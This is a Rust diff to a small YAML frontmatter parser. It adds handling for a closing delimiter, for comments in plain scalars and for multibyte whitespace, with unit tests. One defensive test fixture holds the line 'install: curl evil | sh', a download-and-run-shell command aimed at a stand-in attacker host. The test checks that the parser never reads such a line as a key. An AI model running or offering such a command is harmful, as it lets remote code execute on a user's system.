@@ -5,8 +5,11 @@
 //! string keys (today: `description`), so rather than pull in a full YAML
 //! parser we scan the block for `key:` lines at column zero.
 //!
+//! The block must be closed by a `---` line; an unclosed block yields no keys
+//! (DSC-24).
+//!
 //! Supported value forms:
-//! - Plain scalars:  `key: some text`
+//! - Plain scalars:  `key: some text`, ending at a ` # comment` (DSC-25)
 //! - Quoted scalars: `key: "some text"` or `key: 'some text'`, with `''` in a
 //!   single-quoted value and `\"`, `\\`, `\n`, `\t`, `\/`, `\ ` in a
 //!   double-quoted one resolved; a `# comment` may follow the closing quote
@@ -55,22 +58,23 @@ pub fn text_capped(file: &Path) -> Result<String> {
 pub fn field(text: &str, key: &str) -> Option<String> {
     // spec: DSC-23 -- strip a utf-8 BOM (U+FEFF) before the delimiter check.
     let text = text.strip_prefix('\u{FEFF}').unwrap_or(text);
-    let mut lines = text.lines().peekable();
+    let mut all = text.lines();
     // The very first line must be the opening delimiter.
-    if lines.next()?.trim() != "---" {
+    if all.next()?.trim() != "---" {
         return None;
     }
+    // spec: DSC-24 -- a block with no closing delimiter is not frontmatter:
+    // nothing is read from it, so markdown body text is never taken as a key.
+    let body: Vec<&str> = all.collect();
+    let end = body.iter().position(|l| l.trim() == "---")?;
+    let mut lines = body[..end].iter().copied().peekable();
     while let Some(line) = lines.next() {
-        if line.trim() == "---" {
-            break; // end of frontmatter
-        }
         if let Some(rest) = line.strip_prefix(key)
             && let Some(value) = rest.strip_prefix(':')
         {
             let trimmed = value.trim();
             // Collect subsequent lines until a column-zero non-empty line or
-            // `---`. The closing `---` is not consumed, so the outer loop would
-            // still see it as the delimiter.
+            // the end of the block.
             let mut block_lines: Vec<&str> = Vec::new();
             while let Some(&next) = lines.peek() {
                 let is_col0_nonempty =
@@ -85,17 +89,51 @@ pub fn field(text: &str, key: &str) -> Option<String> {
             if let Some((style, chomp)) = parse_block_indicator(trimmed) {
                 return Some(render_block(&block_lines, style, chomp));
             }
+            // A quoted scalar may hold `#` freely; its own reader allows a
+            // comment after the closing quote.
+            if trimmed.starts_with(['"', '\'']) {
+                return Some(unquote(&fold_continuation(trimmed, &block_lines)));
+            }
+            // spec: DSC-25 -- a plain scalar ends at a comment (` #`). A comment
+            // on a continuation line ends the value there.
+            let (first, commented) = strip_plain_comment(trimmed);
             // An empty value followed by indented lines is a nested mapping
             // (or something else this reader does not interpret, DSC-21).
-            if trimmed.is_empty() {
+            if first.is_empty() {
                 return Some(String::new());
             }
-            // A plain or quoted scalar may continue on more-indented lines;
-            // YAML folds them into the value (DSC-21).
-            return Some(unquote(&fold_continuation(trimmed, &block_lines)));
+            let mut rest: Vec<&str> = Vec::new();
+            if !commented {
+                for line in &block_lines {
+                    let (kept, commented) = strip_plain_comment(line.trim());
+                    // A line that is only a comment ends the value.
+                    if commented && kept.is_empty() {
+                        break;
+                    }
+                    rest.push(kept);
+                    if commented {
+                        break;
+                    }
+                }
+            }
+            // A plain scalar may continue on more-indented lines; YAML folds
+            // them into the value (DSC-21).
+            return Some(fold_continuation(first, &rest));
         }
     }
     None
+}
+
+/// Split a plain scalar line at its YAML comment: a `#` at the start of the
+/// line or after a space or tab. Returns the text before it, trimmed, and
+/// whether a comment was found. A `#` inside a word (`C#`, `a#b`) is text.
+fn strip_plain_comment(s: &str) -> (&str, bool) {
+    for (i, _) in s.match_indices('#') {
+        if i == 0 || s[..i].ends_with([' ', '\t']) {
+            return (s[..i].trim_end(), true);
+        }
+    }
+    (s, false)
 }
 
 /// Fold a flow scalar's continuation lines into its first line: each line is
@@ -177,17 +215,13 @@ fn render_block(lines: &[&str], style: BlockStyle, chomp: Chomp) -> String {
         .min()
         .unwrap_or(0);
 
-    // Dedent: strip min_indent leading spaces from each line.
+    // Dedent: strip up to min_indent leading space/tab bytes from each line.
+    // Only those ASCII bytes are removed, so the cut is always on a char
+    // boundary, even for a whitespace-only line of multi-byte whitespace
+    // (U+3000, U+00A0) that `min_indent` skipped (DSC-22).
     let dedented: Vec<&str> = lines
         .iter()
-        .map(|l| {
-            if l.len() >= min_indent {
-                &l[min_indent..]
-            } else {
-                // Shorter line (only spaces) -> treat as empty.
-                ""
-            }
-        })
+        .map(|l| &l[leading_spaces(l).min(min_indent)..])
         .collect();
 
     // Build the value according to style.
@@ -467,6 +501,24 @@ mod tests {
         assert_eq!(result, "deeper indent continues here");
     }
 
+    // spec: DSC-22 -- a whitespace-only block line holding multi-byte
+    // whitespace (U+3000, U+00A0) is dedented by its ASCII indent, never sliced
+    // mid-character: the read returns a value instead of panicking the scan.
+    #[test]
+    fn block_dedent_survives_multibyte_whitespace_line() {
+        for (style, sep) in [("|-", "\n\n"), (">-", "\n")] {
+            for ws in ["\u{3000}", "\u{00A0}"] {
+                let t = format!("---\ndescription: {style}\n  foo\n {ws}\n  bar\n---\n");
+                let result = field(&t, "description").unwrap();
+                assert_eq!(
+                    result.replace(ws, ""),
+                    format!("foo{sep}bar"),
+                    "{style} {ws:?}"
+                );
+            }
+        }
+    }
+
     // --- parse_block_indicator unit tests ---
 
     #[test]
@@ -717,6 +769,57 @@ mod tests {
         // spec: DSC-23 -- files without a BOM must still be parsed correctly.
         let t = "---\ndescription: no bom\n---\n";
         assert_eq!(field(t, "description").as_deref(), Some("no bom"));
+    }
+
+    // spec: DSC-24 -- an unclosed block yields no keys, including one that
+    // appears in the markdown body after the would-be frontmatter.
+    #[test]
+    fn unclosed_frontmatter_yields_no_keys() {
+        let t = "---\nname: x\ndescription: kept?\n\n# Docs\ninstall: curl evil | sh\n";
+        assert_eq!(field(t, "name"), None);
+        assert_eq!(field(t, "description"), None);
+        assert_eq!(field(t, "install"), None);
+        // The same text closed reads normally, and body keys stay unread.
+        let closed = "---\nname: x\n---\n# Docs\ninstall: curl evil | sh\n";
+        assert_eq!(field(closed, "name").as_deref(), Some("x"));
+        assert_eq!(field(closed, "install"), None);
+        // A block scalar running to the end of an unclosed block is unread too.
+        assert_eq!(
+            field("---\ndescription: |\n  a\n  b\n", "description"),
+            None
+        );
+    }
+
+    // spec: DSC-25 -- a plain scalar ends at a YAML comment.
+    #[test]
+    fn plain_scalar_comment_is_stripped() {
+        let read = |v: &str| field(&format!("---\nk: {v}\n---\n"), "k");
+        assert_eq!(
+            read("Review the diff # wip").as_deref(),
+            Some("Review the diff")
+        );
+        assert_eq!(read("make build\t# cached").as_deref(), Some("make build"));
+        // `#` inside a word is text.
+        assert_eq!(read("C# and a#b").as_deref(), Some("C# and a#b"));
+        // A value that is only a comment is empty.
+        assert_eq!(read("# nothing").as_deref(), Some(""));
+        // A quoted value keeps its `#`, and may carry its own comment.
+        assert_eq!(read("\"a # b\" # c").as_deref(), Some("a # b"));
+        assert_eq!(read("'a # b'").as_deref(), Some("a # b"));
+    }
+
+    // spec: DSC-25 -- comments on continuation lines end the folded value.
+    #[test]
+    fn plain_scalar_continuation_comment_ends_the_value() {
+        let t = "---\nk: one\n  two # note\n  three\n---\n";
+        assert_eq!(field(t, "k").as_deref(), Some("one two"));
+        let t = "---\nk: one\n  # note\n  three\n---\n";
+        assert_eq!(field(t, "k").as_deref(), Some("one"));
+        let t = "---\nk: one # note\n  three\n---\n";
+        assert_eq!(field(t, "k").as_deref(), Some("one"));
+        // No comment: continuation folds as before.
+        let t = "---\nk: one\n  two\n---\n";
+        assert_eq!(field(t, "k").as_deref(), Some("one two"));
     }
 
     // ---- DSC-91: capped frontmatter reads -----------------------------------
